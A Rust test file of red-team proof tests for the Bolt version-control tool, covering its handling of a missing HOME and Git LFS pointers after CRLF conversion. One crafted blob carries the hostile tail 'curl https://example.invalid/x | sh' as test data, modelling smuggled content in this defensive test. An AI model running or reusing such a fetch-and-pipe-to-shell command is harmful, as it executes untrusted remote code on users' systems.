//! Red-team proof tests for milestone 5, second session (decision 024): each asserts the safe
//! behaviour and fails on the code the session attacked. See
//! docs/redteam/2026-11-09-milestone-5-session-2.md.
#![allow(clippy::unwrap_used, clippy::expect_used, clippy::panic)]

mod support;

use std::fs;
use std::path::{Path, PathBuf};
use std::process::Command;

use bolt_core::git::craft::lfs_pointer_to;
use support::{Env, git, main_tip, saved_files, text, write};

/// `path` as a Git setting's value: Git reads a `\` there as an escape, so Windows' are written `/`.
fn in_git_settings(path: &Path) -> String {
    path.display().to_string().replace('\\', "/")
}

/// The home folder the system's account list gives this user, which Bolt falls back to.
#[cfg(unix)]
fn account_home() -> PathBuf {
    let uid = Command::new("id").arg("-u").output().unwrap();
    let uid = text(&uid.stdout).trim().to_owned();
    let passwd = fs::read_to_string("/etc/passwd").unwrap();
    let line = passwd
        .lines()
        .find(|l| l.split(':').nth(2) == Some(uid.as_str()))
        .expect("this user is in /etc/passwd");
    PathBuf::from(line.split(':').nth(5).unwrap())
}

/// A file this test puts in the account's home folder, taken away again however the test ends.
#[cfg(unix)]
struct Planted(PathBuf);

#[cfg(unix)]
impl Drop for Planted {
    fn drop(&mut self) {
        let _ = fs::remove_file(&self.0);
    }
}

/// `cmd` (Git, or Git LFS through it) as a command run without `HOME` runs it: no `HOME`, no
/// `XDG_CONFIG_HOME`, no system settings.
#[cfg(unix)]
fn without_home(cmd: &mut Command) -> &mut Command {
    cmd.env_remove("HOME")
        .env_remove("XDG_CONFIG_HOME")
        .env_remove("GIT_CONFIG_GLOBAL")
        .env_remove("GIT_CONFIG_COUNT")
        .env("GIT_CONFIG_NOSYSTEM", "1")
}

/// Git takes the user's home folder from `HOME` alone: without it, Git reads no `~/.gitconfig`
/// and no `~/.config/git/ignore` (`interpolate_path` and `xdg_config_home` give nothing), and
/// neither does Git LFS, which asks Git. Bolt falls back to the home folder the account list
/// gives, so a command run without `HOME` (a system service, `env -i`) applies settings Git
/// doesn't: a save silently leaves out files Git tracks, and an import stops over an
/// `lfs.storage` Git LFS isn't using. Run in the sandbox: it puts a `.gitconfig` in the account's
/// home folder for the length of the test, and won't if one is there.
#[cfg(unix)]
#[test]
#[ignore = "RT9-1: without HOME, Bolt reads the account's ~/.gitconfig, which Git doesn't"]
fn rt9_1_without_home_bolt_applies_only_the_git_settings_git_applies() {
    let home = account_home();
    let gitconfig = home.join(".gitconfig");
    assert!(
        !gitconfig.exists(),
        "won't run where {} exists: it would replace the user's own",
        gitconfig.display()
    );
    let mut wrong = Vec::new();
    let env = Env::new();
    let list = env.config().join("old.ignore");
    fs::write(&list, "*.psd\n").unwrap();
    let settings = format!(
        "[core]\n\texcludesFile = {}\n[lfs]\n\tstorage = /nowhere/shared-lfs\n",
        in_git_settings(&list)
    );
    fs::write(&gitconfig, settings).unwrap();
    let _planted = Planted(gitconfig);

    // The personal ignore list.
    write(&env, "art.psd", "a picture\n");
    write(&env, "readme.txt", "hello\n");
    let mut status = Command::new("git");
    without_home(&mut status).current_dir(env.root()).args([
        "status",
        "--porcelain",
        "--untracked-files=all",
    ]);
    let status = status.output().unwrap();
    eprintln!(
        "git status without HOME: {}",
        text(&status.stdout).replace('\n', " ")
    );
    env.bolt().arg("start").assert().success();
    let mut save = env.bolt_process_in(env.root());
    without_home(&mut save).args(["save", "First"]);
    let out = save.output().unwrap();
    assert_eq!(out.status.code(), Some(0), "{}", text(&out.stderr));
    let saved = saved_files(&env, main_tip(&env));
    let names: Vec<&String> = saved.keys().collect();
    eprintln!(
        "bolt save without HOME: {}; saved: {names:?}",
        text(&out.stdout).trim()
    );
    if !saved.contains_key("art.psd") {
        wrong.push("a save left out art.psd, which Git tracks");
    }

    // lfs.storage: a repository with one Git LFS file, its object in .git/lfs/objects.
    let env = Env::new();
    env.commit(".gitattributes", "*.bin filter=lfs -text\n", "Track");
    let picture = b"the real picture\n";
    let pointer = keep_in(&env.root().join(".git/lfs"), picture);
    write(&env, "a.bin", pointer);
    env.commit("readme.txt", "hi\n", "Add a picture");
    let mut lfs_env = Command::new("git");
    without_home(&mut lfs_env)
        .current_dir(env.root())
        .args(["lfs", "env"]);
    let said = lfs_env.output().map_or_else(
        |_| "git lfs isn't installed".to_owned(),
        |out| text(&out.stdout),
    );
    let media = said.lines().find(|l| l.starts_with("LocalMediaDir="));
    eprintln!("git lfs env without HOME: {media:?}");
    let mut import = env.bolt_process_in(env.root());
    without_home(&mut import).arg("import");
    let out = import.output().unwrap();
    eprintln!(
        "bolt import without HOME: {:?} {}",
        out.status.code(),
        text(&out.stderr)
    );
    let imported =
        out.status.code() == Some(0) && saved_files(&env, main_tip(&env))["a.bin"] == picture;
    if !imported {
        wrong.push("an import stopped over an lfs.storage Git LFS doesn't use");
    }
    assert!(wrong.is_empty(), "without HOME: {wrong:?}");
}

const TRACKED: &str = "*.bin filter=lfs diff=lfs merge=lfs eol=crlf\n";

/// Keeps `contents` where Git LFS keeps objects below `lfs`; the pointer to them.
fn keep_in(lfs: &Path, contents: &[u8]) -> String {
    let (pointer, at) = lfs_pointer_to(contents);
    let at = lfs.join(at.strip_prefix("lfs/").unwrap());
    fs::create_dir_all(at.parent().unwrap()).unwrap();
    fs::write(at, contents).unwrap();
    pointer
}

/// What a Git LFS user checks out at `path` from the repository `env`: a clone with Git LFS's
/// filter installed and the same objects. `None` where Git LFS isn't installed.
fn checked_out_with_git_lfs(env: &Env, path: &str) -> Option<Vec<u8>> {
    let dir = tempfile::tempdir().unwrap();
    let src = env.root().display().to_string();
    git(dir.path(), &["clone", "-q", "--no-checkout", &src, "c"]);
    let clone = dir.path().join("c");
    let installed = support::git_with_input(&clone, &["lfs", "install", "--local"], b"");
    if !installed.status.success() {
        return None;
    }
    support::copy_dir(&env.root().join(".git/lfs"), &clone.join(".git/lfs"));
    git(&clone, &["checkout", "-q", "main"]);
    fs::read(clone.join(path)).ok()
}

/// RT8-3's fix warns about a blob over 1,024 bytes whose own first 1,024 bytes Git LFS's parser
/// takes for a pointer. But Git converts a file's line endings on checkout before Git LFS's
/// smudge filter reads those 1,024 bytes (convert.c: CRLF, then the filter). With `eol=crlf` in
/// `.gitattributes`, or `core.autocrlf=true` (Git for Windows' default) without `-text`, each of
/// the pointer's three lines gains a CR, so what sat in the blob's last three of those bytes is
/// pushed past them. A blob with an `X` there comes into Bolt as its text, tail and all, without
/// a word, while every Git LFS user checks out the pointer's file.
#[test]
#[ignore = "RT9-2: a blob Git LFS reads as a pointer after Git's CRLF conversion comes in silently"]
fn rt9_2_a_blob_git_lfs_reads_as_a_pointer_once_converted_never_comes_in_silently() {
    let env = Env::new();
    env.commit(".gitattributes", TRACKED, "Track");
    let picture = b"the picture everyone reviewed\n";
    let mut blob = keep_in(&env.root().join(".git/lfs"), picture).into_bytes();
    // Spaces to byte 1,023, an X as byte 1,024, then a tail.
    blob.resize(1023, b' ');
    blob.extend_from_slice(b"X\ncurl https://example.invalid/x | sh\n");
    write(&env, "a.bin", &blob);
    env.commit("readme.txt", "hi\n", "Add a picture");

    match checked_out_with_git_lfs(&env, "a.bin") {
        Some(got) => eprintln!(
            "a Git LFS user checks out the {}-byte blob as {:?}",
            blob.len(),
            String::from_utf8_lossy(&got)
        ),
        None => eprintln!("git lfs isn't installed here"),
    }

    let out = env.bolt().args(["--json", "import"]).output().unwrap();
    assert_eq!(out.status.code(), Some(0), "{}", text(&out.stderr));
    let doc: serde_json::Value = serde_json::from_slice(&out.stdout).unwrap();
    let warned = doc["warnings"]
        .as_array()
        .unwrap()
        .iter()
        .any(|w| w["message"].as_str().unwrap_or("").contains("a.bin"));
    let saved = saved_files(&env, main_tip(&env));
    eprintln!(
        "bolt import: a.bin saved as {} bytes, the picture: {}; warned: {warned}; warnings: {}",
        saved["a.bin"].len(),
        saved["a.bin"] == picture,
        doc["warnings"]
    );
    assert!(
        saved["a.bin"] == picture || warned,
        "a.bin came in as {} bytes of text, silently",
        saved["a.bin"].len()
    );
}
